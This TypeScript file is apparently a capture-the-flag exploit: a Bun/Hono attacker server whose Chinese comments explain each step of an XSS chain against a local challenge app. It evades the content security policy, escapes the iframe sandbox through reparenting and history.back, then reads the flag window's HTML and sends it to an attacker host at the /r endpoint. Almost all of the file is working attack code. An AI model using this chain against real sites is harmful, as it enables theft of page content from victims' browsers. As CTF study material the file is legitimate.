import { Hono } from "hono"

const app = new Hono()

const CHALL_URI = "http://localhost:1337"
const ATTACKER_URI = "http://192.168.1.121:3000"

const utils = `
function wopen(x, y){
  open(x, y).opener = null
}
const sleep = x => new Promise(r => setTimeout(r, x))
`

app.get('/', (c) => {
  return c.html(`
    <script>
      (async function(){
        ${utils}
        // keep a flag page
        wopen("${CHALL_URI}", "flag")
        // 只有同源的情况下能这样从 name 恢复 window 引用，取得 document 等对象
        let final = \`
          <iframe 
            srcdoc="${[
      `<script>`,
      `var win_flag=open('', 'flag');`,
      `var tmp = open('${ATTACKER_URI}/r?f='+encodeURIComponent(win_flag.document.body.innerHTML));`,
      `win_flag.close();`,
      `setTimeout(() => { tmp.close();top.close(); }, 1200);`,
      `<\\/script>`
    ].join('')}"
          ></iframe>
        \`;
        // csp 不会继承到 iframe，所以这个 iframe 可以执行 js，取到自己的 top (也就是本窗口)，然后实现绕过 opener 检查实现导航
        let payload = \`
          <iframe
            sandbox="allow-same-origin allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation"
            src="${ATTACKER_URI}/sub"
          ></iframe>
          <!-- 这个 iframe 实现最终 xss，加上 sandbox，先干掉 csp，留下无 csp 的 history state -->
          <iframe
            sandbox="allow-same-origin"
            src="${CHALL_URI}/memo?memo=\${encodeURIComponent(final)}"
          ></iframe>
        \`;
        wopen(\`${CHALL_URI}/memo?memo=\${encodeURIComponent(payload)}\`, "ok")
        await sleep(1200)
      })()
    </script>
  `)
})

app.get('/sub', (c) => {
  return c.html(`
    <script>
    (async() => {
      ${utils}
      // 等一下 xss payload 加载
      await sleep(1200)
      let clearup = \`
        <iframe></iframe>
        <iframe></iframe>
      \`
      // 开新窗口发出请求，清理 sandboxes
      wopen(\`${CHALL_URI}/memo?memo=\${encodeURIComponent(clearup)}\`, 'clearup')
      // 等一下清理 sandboxes
      await sleep(1200)
      // top window 导航一下，达成 iframe reparenting, iframe 内容还是 xss payload，但是 sandbox 被干掉了，同时没有 csp 的状态从 history 恢复，爽爽拿 flag。
      top.location = URL.createObjectURL(new Blob([\`<script>setTimeout(() => history.back(), 500);<\\/script>\`], { type: "text/html"}))
    })();
    </script>
  `)
})

app.get('/r', c => {
  console.log(c.req.query('f'))
  return c.text("ok")
})

Bun.serve({
  fetch: app.fetch,
  port: 3000
})

console.log(await (await fetch(`${CHALL_URI}/visit?${new URLSearchParams({
  url: ATTACKER_URI
})}`)).text())
